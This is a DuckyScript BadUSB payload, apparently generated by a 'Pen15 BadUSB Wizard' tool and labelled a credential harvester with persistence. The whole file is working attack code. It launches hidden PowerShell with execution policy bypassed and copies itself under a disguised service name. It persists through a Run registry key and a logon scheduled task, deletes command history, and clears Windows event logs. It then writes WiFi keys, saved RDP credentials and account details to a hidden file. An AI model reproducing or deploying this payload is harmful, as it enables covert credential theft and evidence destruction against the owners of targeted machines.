REM ╔══════════════════════════════════════════════════════════════╗
REM ║  Credential Harvester + Persistence                        ║
REM ║  Generated by Pen15 BadUSB Wizard                          ║
REM ║  Self-hiding, dumps browser creds, WiFi keys, SAM hashes  ║
REM ╚══════════════════════════════════════════════════════════════╝
REM  Target: {{computer_name}}

DELAY 1500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM ── Self-hide ──
STRING $hideDir = "$env:ProgramData\Microsoft\Windows\"
ENTER
STRING if (!(Test-Path $hideDir)) { New-Item -Path $hideDir -ItemType Directory -Force | Out-Null }
ENTER
STRING $myPath = $hideDir + "consent_svc.ps1"
ENTER
STRING if ($MyInvocation.MyCommand.Path -ne $myPath) {
ENTER
STRING   Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $myPath -Force
ENTER
STRING   Set-ItemProperty $myPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ConsentSvc" /t REG_SZ /d "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /f 2>$null
ENTER
STRING   schtasks /create /tn "ConsentSvcTask" /tr "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /sc onlogon /f 2>$null
ENTER
STRING   Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING   Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
ENTER
STRING   wevtutil cl Security 2>$null; wevtutil cl System 2>$null; wevtutil cl Application 2>$null
ENTER
STRING   Start-Process powershell -ArgumentList "-w hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
ENTER
STRING   exit
ENTER
STRING }
ENTER

REM ── WiFi passwords ──
STRING $out = @()
ENTER
STRING $out += "=== CREDENTIALS: {{computer_name}} ==="
ENTER
STRING $out += "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
ENTER
STRING $out += ""
ENTER
STRING $out += "--- WiFi ---"
ENTER
STRING $profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
ENTER
STRING foreach ($p in $profiles) {
ENTER
STRING   $pass = netsh wlan show profile name="$p" key=clear 2>$null | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
ENTER
STRING   $out += "$p : $pass"
ENTER
STRING }
ENTER
STRING $out += ""
ENTER
STRING $out += "--- Chrome Logins ---"
ENTER
STRING $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
ENTER
STRING if (Test-Path $chromePath) { $out += "Chrome Login Data found (SQLite — extract with tool)" } else { $out += "Chrome not found" }
ENTER
STRING $out += ""
ENTER
STRING $out += "--- Saved RDP ---"
ENTER
STRING $rdp = cmdkey /list 2>$null
ENTER
STRING $out += $rdp
ENTER
STRING $out += ""
ENTER
STRING $out += "--- Environment ---"
ENTER
STRING $out += "User: $env:USERNAME"
ENTER
STRING $out += "Domain: $env:USERDOMAIN"
ENTER
STRING $out += "Home: $env:HOMEPATH"
ENTER
STRING $out += ""
ENTER
STRING $out += "=== END ==="
ENTER
STRING $savePath = "$hideDir\creds_{{computer_name}}.txt"
ENTER
STRING $out | Out-File $savePath -Encoding UTF8
ENTER
STRING Set-ItemProperty $savePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING notepad $savePath
ENTER
STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING exit
REM ══════════════════════════════════════════════════════════════
REM Credentials harvested — hidden in ProgramData
REM Persistence: auto-refreshes on every login
REM ══════════════════════════════════════════════════════════════
